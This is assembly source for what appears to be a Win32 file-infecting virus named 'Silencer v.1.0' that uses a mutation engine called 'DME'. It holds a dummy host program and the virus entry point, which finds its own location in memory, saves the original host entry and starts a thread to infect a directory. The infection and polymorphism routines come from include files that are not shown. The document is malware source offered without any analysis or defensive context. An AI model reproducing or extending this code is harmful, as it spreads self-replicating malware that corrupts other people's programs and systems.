; Silencer v.1.0
; Using DME v.002b

.386p
.model	flat,stdcall

;-----------------------------------------------------------------------------
.code
extrn	MessageBoxA:proc
extrn	ExitProcess:proc

Msg	db	'Test complete.',0

Host:	Call	MessageBoxA,0,offset Msg,offset Msg,0
	Call	ExitProcess,0
;-----------------------------------------------------------------------------
.data
VEntry:	Call	GetEbp
GetEbp:	pop	ebp
	sub	ebp,5
	mov	eax,offset VEntry
	sub	ebp,eax
	
	mov	eax,[OldHost][ebp]
	push	eax

	Call	InitApi	

	lea	eax,[InfectDir][ebp]
	lea	ebx,[Tid][ebp]
	Call	[CreateThread][ebp],0,128000,eax,ebp,0,ebx

;	Call	InfectDir
	ret
jquit:	pop	eax
	ret

OldHost	dd	offset Host

Tid	dd	0

include	stuff.inc
include	api.inc
include	infect.inc
include	DME.inc

VTbl	dd	offset VEntry
	dd	offset InfectDir
include		dme.tbl
VTbll	equ	($-VTbl-1) shr 2
VLen:
include	virdata.inc
include	data.inc
FLen:
	nop
	nop
buff	db	(FLen-VEntry)*4 dup (0)
include	win32.inc
	nop
end	VEntry